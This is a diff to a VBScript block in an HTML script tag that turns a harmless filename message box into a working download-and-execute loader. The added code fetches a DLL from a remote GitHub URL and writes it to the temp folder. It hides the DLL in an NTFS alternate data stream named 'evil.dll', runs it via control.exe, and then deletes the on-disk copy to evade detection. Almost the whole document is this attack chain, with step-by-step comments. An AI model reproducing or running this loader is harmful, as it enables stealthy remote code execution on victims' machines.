@@ -1,12 +1,47 @@
 <script language="VBScript">
-Dim fso, shell, tempPath, guid, filename
+Dim fso, shell, tempPath, guid, filename, objHTTP, stream, hostFile, adsName
 
 Set shell = CreateObject("WScript.Shell")
 tempPath = shell.ExpandEnvironmentStrings("%temp%")
-
 Set fso = CreateObject("Scripting.FileSystemObject")
 Set guid = CreateObject("Scriptlet.TypeLib")
+
+' Save DLL as a .cpl file for control.exe
 filename = tempPath & "\" & Mid(guid.GUID, 2, 36) & ".dll"
 
-MsgBox "Random DLL filename: " & filename
+' Download DLL (must be a .cpl for control.exe)
+Set objHTTP = CreateObject("MSXML2.XMLHTTP")
+objHTTP.Open "GET", "https://raw.githubusercontent.com/mayuri-ovino/Conhost/refs/heads/main/HelloWorld.dll", False
+objHTTP.Send
+
+' Prepare host file for ADS
+hostFile = tempPath & "\" & Mid(guid.GUID, 2, 36) & ".txt"
+If Not fso.FileExists(hostFile) Then
+  Dim f
+  Set f = fso.CreateTextFile(hostFile, True)
+  f.WriteLine "dummy"
+  f.Close
+End If
+
+' Save DLL to temp file
+Set stream = CreateObject("ADODB.Stream")
+stream.Type = 1 ' Binary
+stream.Open
+stream.Write objHTTP.ResponseBody
+stream.SaveToFile filename, 2
+stream.Close
+
+' Store CPL in ADS using type (preserves binary)
+adsName = "evil.dll"
+shell.Run "cmd /c type """ & filename & """ > """ & hostFile & ":" & adsName & """", 0, True
+
+' Execute CPL from ADS using control.exe
+shell.Run "control.exe """ & hostFile & ":" & adsName & """", 1, False
+
+' Delete the DLL from disk after execution
+If fso.FileExists(filename) Then
+    fso.DeleteFile filename, True
+End If
+
+MsgBox "CPL downloaded, stored in ADS, and executed with control.exe."
 </script>
